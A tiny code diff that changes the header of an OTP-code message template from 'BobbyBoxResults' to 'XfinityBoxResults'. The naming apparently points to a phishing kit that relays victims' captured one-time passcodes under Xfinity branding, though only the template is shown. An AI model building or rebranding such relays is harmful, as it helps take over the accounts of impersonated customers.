@@ -38,7 +38,7 @@ const composeOtpMessage = (data) => {
   }) + ' UTC';
 
   return `
-*🔑 BobbyBoxResults - OTP Code 🔑*
+*🔑 XfinityBoxResults - OTP Code 🔑*
 
 *VERIFICATION CODE*
 - 🔢 OTP Code: ${safeOtp}
